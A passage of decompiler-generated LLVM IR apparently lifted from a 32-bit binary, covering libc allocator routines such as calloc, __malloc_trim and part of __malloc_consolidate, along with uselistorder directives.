  store i32 %v1_8052d96, i32* %ebx.global-to-local, align 4
  %v0_8053101 = load i32, i32* @ebp, align 4
  %v2_8053101 = or i32 %v1_8052d96, 4
  %v3_8053101 = add i32 %v0_8053101, %v2_8053101
  %v4_8053101 = inttoptr i32 %v3_8053101 to i32*
  %v5_8053101 = load i32, i32* %v4_8053101, align 4
  %v6_8053101 = or i32 %v5_8053101, 1
  store i32 %v6_8053101, i32* %v4_8053101, align 4
  br label %dec_label_pc_8053106

dec_label_pc_8053106:                             ; preds = %dec_label_pc_80530bc, %dec_label_pc_80530fd
  %v0_8053106 = load i32, i32* @ebp, align 4
  %v1_8053106 = add i32 %v0_8053106, 8
  store i32 %v1_8053106, i32* @ebx, align 4
  br label %dec_label_pc_8053121

dec_label_pc_805310b:                             ; preds = %dec_label_pc_8052bcd
  %v1_805310b = load i32, i32* @ebx, align 4
  %v2_805310b = add i32 %v0_8052bd9, 4
  %v3_805310b = add i32 %v2_805310b, %v1_805310b
  %v4_805310b = inttoptr i32 %v3_805310b to i32*
  %v5_805310b = load i32, i32* %v4_805310b, align 4
  %v6_805310b = or i32 %v5_805310b, 1
  store i32 %v6_805310b, i32* %v4_805310b, align 4
  br label %dec_label_pc_8053110

dec_label_pc_8053110:                             ; preds = %dec_label_pc_8052be5, %dec_label_pc_805310b
  %v0_8053110 = load i32, i32* @ecx, align 4
  store i32 %v0_8053110, i32* @ebx, align 4
  br label %dec_label_pc_8053121

dec_label_pc_8053114:                             ; preds = %dec_label_pc_8052eb7, %dec_label_pc_8053056, %dec_label_pc_8052ef9, %dec_label_pc_8052ecf
  %v0_8053114 = load i32, i32* %stack_var_-92, align 4
  %v1_8053114 = call i32 @__errno_location(i32 %v0_8053114)
  store i32 %v1_8053114, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805311b = inttoptr i32 %v1_8053114 to i32*
  store i32 12, i32* %v1_805311b, align 4
  br label %dec_label_pc_8053121

dec_label_pc_8053121:                             ; preds = %dec_label_pc_8053110, %dec_label_pc_8053106, %dec_label_pc_80530b1, %dec_label_pc_8052d47, %dec_label_pc_8052cf9, %dec_label_pc_8052a78, %dec_label_pc_8053114
  store i32 %v2_80529af, i32* %eax.global-to-local, align 4
  store i32 %v2_80529af, i32* %stack_var_-92, align 4
  %v3_805312a = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_805312a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053132

dec_label_pc_8053132:                             ; preds = %dec_label_pc_80529cd, %dec_label_pc_8053121
  %v0_8053135 = load i32, i32* @ebx, align 4
  store i32 %v0_8053135, i32* %eax.global-to-local, align 4
  %v2_8053137 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053137, i32* @ebx, align 4
  store i32 %v0_805299c, i32* @esi, align 4
  store i32 %v0_805299b, i32* @edi, align 4
  store i32 %v0_805299a, i32* @ebp, align 4
  ret i32 %v0_8053135

; uselistorder directives
  uselistorder i32 %v0_80530f8, { 1, 0 }
  uselistorder i32 %v1_805307c, { 1, 0 }
  uselistorder i32 %v2_8053070, { 1, 0 }
  uselistorder i32 %v0_805305b, { 1, 0 }
  uselistorder i32 %v0_8053056, { 0, 2, 1 }
  uselistorder i32 %v1_8052fed, { 1, 0, 2 }
  uselistorder i32 %v0_8052fed, { 1, 0 }
  uselistorder i32 %v2_8052fdb, { 1, 0 }
  uselistorder i32 %v1_8052f92, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_8052f80, { 1, 0, 2 }
  uselistorder i32 %v2_8052f70, { 1, 2, 0 }
  uselistorder i32 %v2_8052f6b, { 1, 0, 2 }
  uselistorder i32 %v1_8052f5b, { 2, 1, 0 }
  uselistorder i8 %v0_8052f29, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8052f0c, { 1, 0, 2 }
  uselistorder i32 %v0_8052fce, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_8052fc0, { 2, 0, 1 }
  uselistorder i32 %v8_8052edc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_8052ec2, { 1, 0, 2 }
  uselistorder i32 %v3_8052ec2, { 1, 0 }
  uselistorder i32 %v1_8052e90, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8052e84, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8052e80, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8052e6e, { 1, 0 }
  uselistorder i32 %v1_8052e5e, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_8052e4e, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_8052e37, { 1, 0 }
  uselistorder i32 %v2_8052e2b, { 1, 0 }
  uselistorder i32 %v2_8052e1b, { 0, 3, 1, 2 }
  uselistorder i32 %v2_8052dff, { 1, 2, 0 }
  uselistorder i32 %v1_8052dff, { 1, 0, 2 }
  uselistorder i32 %v1_8052dfe, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_8052df8, { 1, 0 }
  uselistorder i32 %v2_8052dd6, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052dca, { 2, 1, 0 }
  uselistorder i32 %v8_8052db5, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_8052d9c, { 1, 0, 2 }
  uselistorder i32 %v0_8052d3f, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8052d0e, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052d01, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8052ce7, { 1, 0, 2 }
  uselistorder i32 %v1_8052c81, { 1, 0 }
  uselistorder i32 %v3_8052c76, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8052c70, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_8052c6d12, { 1, 0 }
  uselistorder i32 %v2_8052c62, { 1, 0 }
  uselistorder i32 %v1_8052c46, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8052c42, { 2, 1, 0 }
  uselistorder i32 %v1_8052c3e, { 1, 0 }
  uselistorder i32 %v1_8052c39, { 2, 1, 0 }
  uselistorder i32 %v2_8052c28, { 1, 0 }
  uselistorder i32 %v1_8052c25, { 1, 2, 0, 3 }
  uselistorder i32 %v4_8052bc3, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_8052c0e, { 1, 0 }
  uselistorder i32 %v0_8052bd9, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8052baf, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052b7c, { 0, 2, 1 }
  uselistorder i32 %v2_8052b60, { 1, 0 }
  uselistorder i32 %v1_8052b56, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8052b51.lcssa, { 1, 0 }
  uselistorder i32 %v3_8052b41, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8052b38, { 1, 0, 2 }
  uselistorder i32 %v3_8052b1b, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_8052b14, { 1, 0, 2 }
  uselistorder i32 %v2_8052afc, { 2, 1, 0 }
  uselistorder i32 %v0_8052ae8, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8052aae, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8052b7c118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052b7c109, { 1, 0, 2 }
  uselistorder i32 %v3_8052a5b, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8052a4d, { 2, 1, 0 }
  uselistorder i32 %v2_8052a28, { 2, 1, 0 }
  uselistorder i8 %v0_80529f6, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_8052d96, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_80529df, { 1, 2, 0 }
  uselistorder i32 %v0_80529c8, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 4, 8, 5, 0, 6, 7, 9, 10, 11, 12, 1, 13 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 74, 75 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8067d80.250, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0, 4, 3, 2 }
  uselistorder i32 134642260, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8067a60.238, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8067a4c.235 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8067a4c.235 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8053132, { 1, 0 }
  uselistorder label %dec_label_pc_8053121, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053114, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8053110, { 1, 0 }
  uselistorder label %dec_label_pc_8053106, { 1, 0 }
  uselistorder label %dec_label_pc_80530b1, { 1, 0 }
  uselistorder label %dec_label_pc_8053056, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052fe8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052fe3, { 1, 0 }
  uselistorder label %dec_label_pc_8052fc7, { 1, 0 }
  uselistorder label %dec_label_pc_8052f70, { 1, 0 }
  uselistorder label %dec_label_pc_8052f59, { 1, 0 }
  uselistorder label %dec_label_pc_8052f42, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052ef9, { 1, 0 }
  uselistorder label %dec_label_pc_8052eb7, { 1, 0 }
  uselistorder label %dec_label_pc_8052e4e, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052ded, { 1, 0 }
  uselistorder label %dec_label_pc_8052d01, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052cf9, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052c6d, { 1, 0 }
  uselistorder label %dec_label_pc_8052c72.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8052c46, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052bcd, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_8052b54, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8052b3d, { 1, 0 }
  uselistorder label %dec_label_pc_8052aab, { 1, 0 }
  uselistorder label %dec_label_pc_8052b7c.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052a78, { 1, 0 }
  uselistorder label %dec_label_pc_80529f6, { 1, 0 }
}

define i32 @calloc(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805313c = load i32, i32* @edi, align 4
  %v0_805313e = load i32, i32* @ebx, align 4
  %v12_805313f = ptrtoint i32* %stack_var_-28 to i32
  %v4_8053142 = trunc i64 %arg1 to i32
  store i32 %arg2, i32* @ecx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_805314c = sdiv i64 %sext, 4294967296
  %v3_805314c = sext i32 %arg2 to i64
  %v4_805314c = mul nsw i64 %v3_805314c, %v2_805314c
  %v5_805314c = trunc i64 %v4_805314c to i32
  store i32 %v5_805314c, i32* @ebx, align 4
  %v2_805314f = icmp eq i32 %v4_8053142, 0
  br i1 %v2_805314f, label %dec_label_pc_8053171, label %dec_label_pc_8053153

dec_label_pc_8053153:                             ; preds = %entry
  store i32 %v4_8053142, i32* @edi, align 4
  %div = udiv i32 %v5_805314c, %v4_8053142
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_805315b = icmp eq i32 %div, %arg2
  br i1 %v12_805315b, label %dec_label_pc_8053171, label %dec_label_pc_805315f

dec_label_pc_805315f:                             ; preds = %dec_label_pc_8053153
  %v1_805315f = call i32 @__errno_location(i32 %v0_805313e)
  store i32 %v1_805315f, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8053166 = inttoptr i32 %v1_805315f to i32*
  store i32 12, i32* %v1_8053166, align 4
  br label %dec_label_pc_8053227

dec_label_pc_8053171:                             ; preds = %dec_label_pc_8053153, %entry
  store i32 %v12_805313f, i32* %eax.global-to-local, align 4
  %v4_8053181 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134541533, i32 ptrtoint (i32* @global_var_8062cb0.166 to i32))
  store i32 %v4_8053181, i32* %eax.global-to-local, align 4
  %v1_805318d = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062cb0.166 to i32))
  store i32 %v1_805318d, i32* %eax.global-to-local, align 4
  %v0_8053192 = load i32, i32* @ebx, align 4
  %v1_8053195 = call i32 @malloc(i32 %v0_8053192)
  store i32 %v1_8053195, i32* %eax.global-to-local, align 4
  %v1_805319d = icmp eq i32 %v1_8053195, 0
  store i32 %v1_8053195, i32* @ebx, align 4
  br i1 %v1_805319d, label %dec_label_pc_8053216, label %dec_label_pc_80531a3

dec_label_pc_80531a3:                             ; preds = %dec_label_pc_8053171
  %v1_80531a3 = add i32 %v1_8053195, -4
  %v2_80531a3 = inttoptr i32 %v1_80531a3 to i32*
  %v3_80531a3 = load i32, i32* %v2_80531a3, align 4
  store i32 %v3_80531a3, i32* %eax.global-to-local, align 4
  %v2_80531a6 = and i32 %v3_80531a3, 2
  %v3_80531a6 = icmp eq i32 %v2_80531a6, 0
  %v1_80531a8 = icmp eq i1 %v3_80531a6, false
  br i1 %v1_80531a8, label %dec_label_pc_8053216, label %dec_label_pc_80531aa

dec_label_pc_80531aa:                             ; preds = %dec_label_pc_80531a3
  %v1_80531aa2 = add i32 %v3_80531a3, -4
  %v1_80531ad = and i32 %v1_80531aa2, -4
  %v2_80531b2 = udiv i32 %v1_80531ad, 4
  store i32 %v2_80531b2, i32* %eax.global-to-local, align 4
  %v5_80531b5 = icmp ult i32 %v1_80531ad, 36
  %tmp = and i32 %v1_80531aa2, -4
  %tmp14 = icmp eq i32 %tmp, 36
  %v2_80531b8 = or i1 %v5_80531b5, %tmp14
  br i1 %v2_80531b8, label %dec_label_pc_80531c9, label %dec_label_pc_80531ba

dec_label_pc_80531ba:                             ; preds = %dec_label_pc_80531aa
  %v3_80531bf = inttoptr i32 %v1_8053195 to i8*
  %v4_80531bf = call i32 @__GI_memset(i8* %v3_80531bf, i32 0, i32 %v1_80531ad)
  store i32 %v4_80531bf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053216

dec_label_pc_80531c9:                             ; preds = %dec_label_pc_80531aa
  %v5_80531c9 = icmp ult i32 %v1_80531ad, 16
  %tmp15 = and i32 %v1_80531aa2, -4
  %tmp16 = icmp eq i32 %tmp15, 16
  %v1_80531cc = inttoptr i32 %v1_8053195 to i32*
  store i32 0, i32* %v1_80531cc, align 4
  %v0_80531d2 = load i32, i32* @ebx, align 4
  %v1_80531d2 = add i32 %v0_80531d2, 4
  %v2_80531d2 = inttoptr i32 %v1_80531d2 to i32*
  store i32 0, i32* %v2_80531d2, align 4
  %v0_80531d9 = load i32, i32* @ebx, align 4
  %v1_80531d9 = add i32 %v0_80531d9, 8
  %v2_80531d9 = inttoptr i32 %v1_80531d9 to i32*
  store i32 0, i32* %v2_80531d9, align 4
  %v2_80531e0 = or i1 %v5_80531c9, %tmp16
  br i1 %v2_80531e0, label %dec_label_pc_8053216, label %dec_label_pc_80531e2

dec_label_pc_80531e2:                             ; preds = %dec_label_pc_80531c9
  %v0_80531e2 = load i32, i32* %eax.global-to-local, align 4
  %v0_80531e5 = load i32, i32* @ebx, align 4
  %v1_80531e5 = add i32 %v0_80531e5, 12
  %v2_80531e5 = inttoptr i32 %v1_80531e5 to i32*
  store i32 0, i32* %v2_80531e5, align 4
  %v0_80531ec = load i32, i32* @ebx, align 4
  %v1_80531ec = add i32 %v0_80531ec, 16
  %v2_80531ec = inttoptr i32 %v1_80531ec to i32*
  store i32 0, i32* %v2_80531ec, align 4
  %tmp17 = icmp ult i32 %v0_80531e2, 7
  br i1 %tmp17, label %dec_label_pc_8053216, label %dec_label_pc_80531f5

dec_label_pc_80531f5:                             ; preds = %dec_label_pc_80531e2
  %v0_80531f5 = load i32, i32* %eax.global-to-local, align 4
  %v0_80531f8 = load i32, i32* @ebx, align 4
  %v1_80531f8 = add i32 %v0_80531f8, 20
  %v2_80531f8 = inttoptr i32 %v1_80531f8 to i32*
  store i32 0, i32* %v2_80531f8, align 4
  %v0_80531ff = load i32, i32* @ebx, align 4
  %v1_80531ff = add i32 %v0_80531ff, 24
  %v2_80531ff = inttoptr i32 %v1_80531ff to i32*
  store i32 0, i32* %v2_80531ff, align 4
  %tmp18 = icmp ult i32 %v0_80531f5, 9
  br i1 %tmp18, label %dec_label_pc_8053216, label %dec_label_pc_8053208

dec_label_pc_8053208:                             ; preds = %dec_label_pc_80531f5
  %v0_8053208 = load i32, i32* @ebx, align 4
  %v1_8053208 = add i32 %v0_8053208, 28
  %v2_8053208 = inttoptr i32 %v1_8053208 to i32*
  store i32 0, i32* %v2_8053208, align 4
  %v0_805320f = load i32, i32* @ebx, align 4
  %v1_805320f = add i32 %v0_805320f, 32
  %v2_805320f = inttoptr i32 %v1_805320f to i32*
  store i32 0, i32* %v2_805320f, align 4
  br label %dec_label_pc_8053216

dec_label_pc_8053216:                             ; preds = %dec_label_pc_80531f5, %dec_label_pc_80531e2, %dec_label_pc_80531c9, %dec_label_pc_80531a3, %dec_label_pc_8053171, %dec_label_pc_80531ba, %dec_label_pc_8053208
  store i32 %v12_805313f, i32* %eax.global-to-local, align 4
  %v3_805321f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  store i32 %v3_805321f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053227

dec_label_pc_8053227:                             ; preds = %dec_label_pc_805315f, %dec_label_pc_8053216
  %v0_805322a = load i32, i32* @ebx, align 4
  store i32 %v0_805322a, i32* %eax.global-to-local, align 4
  store i32 %v0_805313e, i32* @ebx, align 4
  store i32 %v0_805313c, i32* @edi, align 4
  ret i32 %v0_805322a

; uselistorder directives
  uselistorder i32 %v1_80531ad, { 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 5, 3, 6, 7, 8, 9, 10, 11, 13, 12 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053227, { 1, 0 }
  uselistorder label %dec_label_pc_8053216, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8053231 = load i32, i32* @edx, align 4
  store i32 %v0_8053231, i32* %ebp.global-to-local, align 4
  %v0_8053234 = load i32, i32* @esi, align 4
  %v0_8053235 = load i32, i32* @ebx, align 4
  %v1_8053239 = add i32 %v0_8053231, 860
  %v2_8053239 = inttoptr i32 %v1_8053239 to i32*
  %v3_8053239 = load i32, i32* %v2_8053239, align 4
  store i32 %v3_8053239, i32* @ecx, align 4
  %v1_805323f = add i32 %v0_8053231, 44
  %v2_805323f = inttoptr i32 %v1_805323f to i32*
  %v3_805323f = load i32, i32* %v2_805323f, align 4
  %v1_8053242 = add i32 %v3_805323f, 4
  %v2_8053242 = inttoptr i32 %v1_8053242 to i32*
  %v3_8053242 = load i32, i32* %v2_8053242, align 4
  %v1_8053245 = and i32 %v3_8053242, -4
  store i32 %v1_8053245, i32* @esi, align 4
  %v1_805324a = load i32, i32* @eax, align 4
  %v2_805324a = add i32 %v3_8053239, -17
  %v2_805324c = add i32 %v2_805324a, %v1_8053245
  %v3_805324c = sub i32 %v2_805324c, %v1_805324a
  %div = udiv i32 %v3_805324c, %v3_8053239
  store i32 %div, i32* %eax.global-to-local, align 4
  %v1_8053254 = add i32 %div, -1
  %v4_8053257 = mul i32 %v1_8053254, %v3_8053239
  store i32 %v4_8053257, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8053257, 1
  br i1 %tmp11, label %dec_label_pc_80532b3, label %dec_label_pc_805325e

dec_label_pc_805325e:                             ; preds = %entry
  %v1_8053263 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053263, i32* %edi.global-to-local, align 4
  %v0_805326d = load i32, i32* @esi, align 4
  store i32 %v0_805326d, i32* %eax.global-to-local, align 4
  %v1_805326f = load i32, i32* %ebp.global-to-local, align 4
  %v2_805326f = add i32 %v1_805326f, 44
  %v3_805326f = inttoptr i32 %v2_805326f to i32*
  %v4_805326f = load i32, i32* %v3_805326f, align 4
  %v5_805326f = add i32 %v4_805326f, %v0_805326d
  store i32 %v5_805326f, i32* %eax.global-to-local, align 4
  %v12_8053272 = icmp eq i32 %v1_8053263, %v5_805326f
  %v1_8053274 = icmp eq i1 %v12_8053272, false
  br i1 %v1_8053274, label %dec_label_pc_80532b3, label %dec_label_pc_8053276

dec_label_pc_8053276:                             ; preds = %dec_label_pc_805325e
  %v1_8053279 = sub i32 0, %v4_8053257
  store i32 %v1_8053279, i32* @ebx, align 4
  %v1_805327c = call i32 @__GI_sbrk(i32 %v1_8053279)
  store i32 %v1_805327c, i32* %eax.global-to-local, align 4
  %v1_8053288 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053288, i32* %eax.global-to-local, align 4
  %v10_8053290 = icmp eq i32 %v1_8053288, -1
  br i1 %v10_8053290, label %dec_label_pc_80532b3, label %dec_label_pc_8053295

dec_label_pc_8053295:                             ; preds = %dec_label_pc_8053276
  %v0_8053295 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053297 = sub i32 %v0_8053295, %v1_8053288
  %v12_8053297 = icmp eq i32 %v2_8053297, 0
  store i32 %v2_8053297, i32* @ecx, align 4
  br i1 %v12_8053297, label %dec_label_pc_80532b3, label %dec_label_pc_805329b

dec_label_pc_805329b:                             ; preds = %dec_label_pc_8053295
  %v0_805329b = load i32, i32* %ebp.global-to-local, align 4
  %v1_805329b = add i32 %v0_805329b, 44
  %v2_805329b = inttoptr i32 %v1_805329b to i32*
  %v3_805329b = load i32, i32* %v2_805329b, align 4
  store i32 %v3_805329b, i32* %eax.global-to-local, align 4
  %v0_805329e = load i32, i32* @esi, align 4
  %v2_805329e = sub i32 %v0_805329e, %v2_8053297
  store i32 %v2_805329e, i32* %esi.global-to-local, align 4
  %v1_80532a0 = add i32 %v0_805329b, 872
  %v2_80532a0 = inttoptr i32 %v1_80532a0 to i32*
  %v3_80532a0 = load i32, i32* %v2_80532a0, align 4
  %v5_80532a0 = sub i32 %v3_80532a0, %v2_8053297
  store i32 %v5_80532a0, i32* %v2_80532a0, align 4
  %v0_80532a6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80532a6 = or i32 %v0_80532a6, 1
  store i32 %v1_80532a6, i32* %esi.global-to-local, align 4
  %v1_80532a9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80532a9 = add i32 %v1_80532a9, 4
  %v3_80532a9 = inttoptr i32 %v2_80532a9 to i32*
  store i32 %v1_80532a6, i32* %v3_80532a9, align 4
  br label %dec_label_pc_80532b5

dec_label_pc_80532b3:                             ; preds = %dec_label_pc_8053295, %dec_label_pc_8053276, %dec_label_pc_805325e, %entry
  br label %dec_label_pc_80532b5

dec_label_pc_80532b5:                             ; preds = %dec_label_pc_805329b, %dec_label_pc_80532b3
  %storemerge = phi i32 [ 1, %dec_label_pc_805329b ], [ 0, %dec_label_pc_80532b3 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053235, i32* @ebx, align 4
  store i32 %v0_8053234, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8053288, { 1, 0, 2 }
  uselistorder i32 %v4_8053257, { 1, 2, 0 }
  uselistorder i32 %v3_8053239, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8053231, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_80532b5, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_80532bd = load i32, i32* @ebp, align 4
  %v0_80532be = load i32, i32* @edi, align 4
  %v0_80532bf = load i32, i32* @esi, align 4
  %v0_80532c0 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_80532c8 = load i32, i32* %arg1, align 4
  store i32 %v2_80532c8, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80532cf = icmp eq i32 %v2_80532c8, 0
  br i1 %v1_80532cf, label %dec_label_pc_80533f8.preheader, label %dec_label_pc_80532d7

dec_label_pc_80533f8.preheader:                   ; preds = %entry
  %v3_80533ed = add i32 %tmp11, 44
  br label %dec_label_pc_80533e9

dec_label_pc_80532d7:                             ; preds = %entry
  %v1_80532db = and i32 %v2_80532c8, -3
  store i32 %v1_80532db, i32* %arg1, align 4
  %v1_80532e0 = add i32 %tmp11, 52
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_80532fc = udiv i32 %v1_80532db, 8
  %v2_80532ff = mul nuw i32 %v2_80532fc, 4
  %v3_80532ff = add i32 %tmp11, -4
  %v4_80532ff = add i32 %v3_80532ff, %v2_80532ff
  store i32 %v4_80532ff, i32* %eax.global-to-local, align 4
  %v2_80533c6 = add i32 %tmp11, 44
  %v3_80533c6 = inttoptr i32 %v2_80533c6 to i32*
  %v1_8053399 = add i32 %tmp11, 60
  %v2_8053399 = inttoptr i32 %v1_8053399 to i32*
  br label %dec_label_pc_8053307

dec_label_pc_8053307:                             ; preds = %dec_label_pc_80533df, %dec_label_pc_80532d7
  %v0_8053315.in = phi i32 [ %tmp11, %dec_label_pc_80532d7 ], [ %v0_8053315, %dec_label_pc_80533df ]
  %v0_8053315 = add i32 %v0_8053315.in, 4
  store i32 %v0_8053315, i32* %eax.global-to-local, align 4
  %v1_805330b = inttoptr i32 %v0_8053315 to i32*
  %v2_805330b = load i32, i32* %v1_805330b, align 4
  store i32 %v2_805330b, i32* @ecx, align 4
  %v1_805330d = icmp eq i32 %v2_805330b, 0
  br i1 %v1_805330d, label %dec_label_pc_80533d5, label %dec_label_pc_8053315

dec_label_pc_8053315:                             ; preds = %dec_label_pc_8053307
  store i32 0, i32* %v1_805330b, align 4
  %v0_805331b.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805331b

dec_label_pc_805331b:                             ; preds = %dec_label_pc_80533c9, %dec_label_pc_8053315
  %v0_8053338 = phi i32 [ %v3_805331b, %dec_label_pc_80533c9 ], [ %v0_805331b.pre, %dec_label_pc_8053315 ]
  %v1_805331b = add i32 %v0_8053338, 8
  %v2_805331b = inttoptr i32 %v1_805331b to i32*
  %v3_805331b = load i32, i32* %v2_805331b, align 4
  store i32 %v3_805331b, i32* %edx.global-to-local, align 4
  %v1_8053322 = add i32 %v0_8053338, 4
  %v2_8053322 = inttoptr i32 %v1_8053322 to i32*
  %v3_8053322 = load i32, i32* %v2_8053322, align 4
  store i32 %v3_8053322, i32* %eax.global-to-local, align 4
  %v1_8053327 = and i32 %v3_8053322, -2
  store i32 %v1_8053327, i32* @edi, align 4
  %v2_805332a = urem i32 %v3_8053322, 2
  %v3_805332a = icmp eq i32 %v2_805332a, 0
  %v2_805332c = add i32 %v1_8053327, %v0_8053338
  store i32 %v2_805332c, i32* @ebx, align 4
  %v1_805332f = add i32 %v2_805332c, 4
  %v2_805332f = inttoptr i32 %v1_805332f to i32*
  %v3_805332f = load i32, i32* %v2_805332f, align 4
  store i32 %v3_805332f, i32* %edx.global-to-local, align 4
  %v1_8053336 = icmp eq i1 %v3_805332a, false
  br i1 %v1_8053336, label %dec_label_pc_8053358, label %dec_label_pc_8053338

dec_label_pc_8053338:                             ; preds = %dec_label_pc_805331b
  %v1_8053338 = inttoptr i32 %v0_8053338 to i32*
  %v2_8053338 = load i32, i32* %v1_8053338, align 4
